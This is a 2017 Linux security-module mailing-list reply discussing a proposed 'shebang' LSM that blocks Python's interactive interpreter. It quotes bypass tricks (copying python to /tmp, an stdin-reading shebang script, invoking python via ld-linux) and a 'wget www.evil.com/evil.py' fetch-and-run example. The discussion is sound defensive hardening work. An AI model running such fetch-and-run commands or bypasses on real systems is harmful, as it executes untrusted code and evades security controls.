From: matt@nmatt.com (Matt Brown)
Date: Fri, 9 Jun 2017 10:50:42 -0400
Subject: [PATCH v1] shebang: restrict python interactive prompt/interpreter
In-Reply-To: <201706092302.HCE57804.OSFJFVtMLOQHFO@I-love.SAKURA.ne.jp>
References: <1497014528.21594.190.camel@linux.vnet.ibm.com>
	<201706092302.HCE57804.OSFJFVtMLOQHFO@I-love.SAKURA.ne.jp>
Message-ID: <bf9f44f5-7b9c-dff1-10e0-84c866c3a372@nmatt.com>
To: linux-security-module@vger.kernel.org
List-Id: linux-security-module.vger.kernel.org

On 6/9/17 10:02 AM, Tetsuo Handa wrote:
> Mimi Zohar wrote:
>> This patch defines a new, minor LSM named "shebang", that restricts
>> python such that scripts are allowed to execute, while the interactive
>> prompt/interpreter is not available.  When used in conjunction with an
>> IMA appraise execute policy requiring files signatures, only signed
>> python scripts would be allowed to execute.  (A separate method for
>> identifying "imported" code would need to be defined in order to verify
>> their file signatures.)

FYI Mimi posted this because of this current discussion here:
http://www.openwall.com/lists/kernel-hardening/2017/06/09/13

> 
> Below case is blocked by IMA?
> 
>    $ cp -p /usr/bin/python2 /tmp
>    $ /tmp/python2
> 
> Below case is also blocked by IMA?
> 
>    $ echo '#!/usr/bin/python2 -' > /tmp/run-python
>    $ chmod +x /tmp/run-python
>    $ /tmp/run-python
> 

Does IMA have a way to prevent the following? I think this is the main
case we are protection against with this LSM.

$ wget www.evil.com/evil.py
$ /usr/bin/python2 evil.py

> What about execution via ld-linux ?
> 
>    $ /lib64/ld-linux-x86-64.so.2 /usr/bin/python2
> 

Just tested this and you are correct, this allows you to bypass the
protection.

I was able to fix this bypass by including /lib64/ld-linux-x86-64.so.2
in the list of interpreters.

Matt
--
To unsubscribe from this list: send the line "unsubscribe linux-security-module" in
the body of a message to majordomo at vger.kernel.org
More majordomo info at  http://vger.kernel.org/majordomo-info.html
